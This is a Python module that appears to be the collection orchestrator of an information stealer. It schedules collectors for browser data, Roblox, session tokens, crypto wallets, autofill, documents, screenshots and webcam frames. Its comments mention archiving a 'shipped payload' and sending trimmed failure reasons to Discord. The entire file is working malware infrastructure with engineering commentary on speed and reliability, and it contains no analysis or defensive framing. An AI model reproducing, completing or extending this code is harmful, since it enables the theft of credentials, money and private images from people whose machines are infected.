"""Collector registry and the run order.

One entry per ``SourceConfig`` flag. ``system`` owns three modules, because network
and display inventory are part of the system picture and have no flag of their own.
``visual`` owns two, because a screenshot and a webcam frame belong to one question.

Every collector obeys the same contract: ``run(out_dir, cfg) -> int``, returning the
number of items written, and it is handed the directory ``layout`` says it owns rather
than the workspace root. A collector that raises is logged and counted as zero, so one
broken artifact source cannot take the rest of the run with it.

Modules run four at a time on daemon threads. Sequential was eight minutes on a machine
with four browser profiles; the expensive modules touch different files, so the only
thing the serial order bought was latency. The pool is hand-rolled rather than an
``Executor`` because a module that hangs must not keep the interpreter alive at exit:
``ThreadPoolExecutor`` joins its workers in ``threading._shutdown`` and a stuck GDI or
SQLite call would turn a finished run into a process nobody can kill.

A global deadline bounds the wait. Modules that miss it are recorded as failures with
``reason: deadline`` and the partial workspace is archived: a shipped payload with one
missing collector beats a run that never returns.
"""

from __future__ import annotations

import importlib
import queue
import threading
import time
from pathlib import Path
from typing import Any, Final

from .. import layout, log

# flag on SourceConfig -> module names, in the order they run inside their own lane
_PLAN: Final[tuple[tuple[str, tuple[str, ...]], ...]] = (
    ("system", ("system", "network", "displays")),
    ("browsers", ("browsers", "roblox")),
    ("sessions", ("sessions",)),
    ("wallets", ("wallets",)),
    ("autofill", ("autofill",)),
    ("documents", ("documents",)),
    ("visual", ("screen", "camera")),
)

# Modules are independent; four at a time covers the disk-bound pair (browsers, roblox)
# plus the cheap system trio without letting eleven threads fight over one spindle.
_WORKERS: Final[int] = 4

# Wall clock for the whole collection. A profile set that takes longer than this has
# stopped producing new data and started holding the process open.
_DEADLINE_SECONDS: Final[float] = 300.0

# Per-module ceiling, applied by the pool: past this the module is abandoned in place
# (its thread stays until exit) and the run continues without it.
_MODULE_SECONDS: Final[float] = 120.0


def _enabled(cfg: Any) -> list[str]:
    names: list[str] = []
    for flag, modules in _PLAN:
        if not getattr(cfg.sources, flag, False):
            log.logger.debug("sources: %s disabled", flag)
            continue
        names.extend(modules)
    return names


def run_all(
    out_dir: Path,
    cfg: Any,
    *,
    state: Any | None = None,
) -> tuple[dict[str, int], dict[str, str]]:
    """Run every enabled collector that has not already finished.

    Returns ``(counts, failures)``: module name -> items written, and module name ->
    the short reason it produced nothing. Two maps rather than one because a zero and a
    crash look identical in a count, and "sessions: 0" is the difference between a
    machine with no tokens and a browser store that refused to be read.
    """
    counts: dict[str, int] = {}
    failures: dict[str, str] = {}
    timings: dict[str, float] = {}
    started = time.perf_counter()

    layout.prepare(out_dir)

    pending = _enabled(cfg)
    done = state.done_modules() if state is not None else set()
    resumed_counts = state.counts() if state is not None else {}

    for name in list(pending):
        if name in done:
            # The module finished in an earlier run: keep its count, skip the work, and
            # keep its directory. Only a resumable state gets here at all.
            counts[name] = int(resumed_counts.get(name, 0))
            pending.remove(name)
            log.logger.debug("sources: %s already done, skipping", name)

    if pending:
        _run_pool(pending, out_dir, cfg, counts, failures, timings, state)

    if timings:
        slowest = max(timings, key=lambda name: timings[name])
        log.logger.debug(
            "sources: %d modules in %.1f s, slowest %s at %.1f s",
            len(timings),
            time.perf_counter() - started,
            slowest,
            timings[slowest],
        )

    return counts, failures


def _run_pool(
    names: list[str],
    out_dir: Path,
    cfg: Any,
    counts: dict[str, int],
    failures: dict[str, str],
    timings: dict[str, float],
    state: Any | None,
) -> None:
    tasks: queue.Queue[str] = queue.Queue()
    for name in names:
        tasks.put(name)

    guard = threading.Lock()
    finished = threading.Event()
    remaining = [len(names)]

    def worker() -> None:
        while True:
            try:
                name = tasks.get_nowait()
            except queue.Empty:
                return
            written, reason, elapsed = _run_one(name, out_dir, cfg)
            with guard:
                counts[name] = written
                timings[name] = elapsed
                if reason:
                    failures[name] = reason
                if state is not None:
                    if reason:
                        state.failed(name, reason)
                    else:
                        state.mark(name, written, elapsed)
                remaining[0] -= 1
                if remaining[0] <= 0:
                    finished.set()

    for index in range(min(_WORKERS, len(names))):
        threading.Thread(target=worker, name=f"sable-collect-{index}", daemon=True).start()

    deadline = time.monotonic() + _DEADLINE_SECONDS
    while not finished.is_set():
        left = deadline - time.monotonic()
        if left <= 0:
            with guard:
                missing = [name for name in names if name not in counts]
            for name in missing:
                counts.setdefault(name, 0)
                failures[name] = "deadline"
                if state is not None:
                    state.failed(name, "deadline")
            log.logger.warning("sources: deadline reached, missing %s", missing)
            return
        finished.wait(min(left, 0.25))


def _reason(exc: BaseException) -> str:
    """The class name and a trimmed message, because Discord truncates anyway."""
    text = str(exc).strip().splitlines()[0][:80] if str(exc).strip() else ""
    return f"{type(exc).__name__}: {text}" if text else type(exc).__name__


def _run_one(name: str, out_dir: Path, cfg: Any) -> tuple[int, str, float]:
    """Run one collector. Returns items written, a failure reason, and seconds taken."""
    started = time.perf_counter()

    try:
        module = importlib.import_module(f".{name}", __name__)
    except Exception as exc:
        log.logger.exception("sources: %s could not be imported", name)
        return 0, _reason(exc), time.perf_counter() - started

    runner = getattr(module, "run", None)
    if runner is None:
        log.logger.error("sources: %s has no run()", name)
        return 0, "no run()", time.perf_counter() - started

    target = layout.module_dir(out_dir, name)

    try:
        written = int(runner(target, cfg))
    except Exception as exc:
        log.logger.exception("sources: %s raised", name)
        elapsed = time.perf_counter() - started
        log.logger.debug("sources: %s failed after %.2f s", name, elapsed)
        return 0, _reason(exc), elapsed

    elapsed = time.perf_counter() - started
    log.logger.debug("sources: %s wrote %d in %.2f s", name, written, elapsed)
    return written, "", elapsed


__all__ = ["run_all"]
